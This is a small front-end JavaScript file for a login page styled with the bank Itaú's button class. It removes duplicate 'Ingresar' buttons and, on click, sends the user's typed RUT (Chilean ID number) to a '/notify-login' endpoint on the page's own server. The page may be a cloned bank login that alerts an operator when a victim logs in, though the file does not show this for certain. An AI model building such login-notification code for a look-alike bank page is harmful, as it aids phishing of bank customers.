// public/script.js
document.addEventListener('DOMContentLoaded', () => {
  // 1) Eliminar botones duplicados con texto "Ingresar", mantener el primero
  const botones = Array.from(document.querySelectorAll('button, a.itau-btn'));
  const ingresar = botones.filter(b => b.textContent && b.textContent.trim() === 'Ingresar');
  if (ingresar.length > 1) {
    ingresar.slice(1).forEach(b => b.remove());
    console.log('Duplicados de "Ingresar" eliminados.');
  }

  // 2) Obtener el botón principal (por id preferido)
  const mainBtn = document.getElementById('btnLogin') || (ingresar.length ? ingresar[0] : null);
  if (!mainBtn) return;

  mainBtn.addEventListener('click', async (e) => {
    try {
      // obtener RUT del input (no tomar la clave)
      const rutInput = document.getElementById('rut_usuarioID') || document.querySelector('input[name="rut_usuario"]');
      const rutVal = rutInput ? rutInput.value.trim() : '';

      // enviar notificación al servidor (no bloqueamos la UI)
      fetch('/notify-login', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ rut: rutVal })
      }).catch(err => console.error('Error enviando /notify-login:', err));

      // Aquí sigue tu flujo normal de login (redirección o validación)
    } catch (err) {
      console.error('Error en handler de ingreso:', err);
    }
  });
});
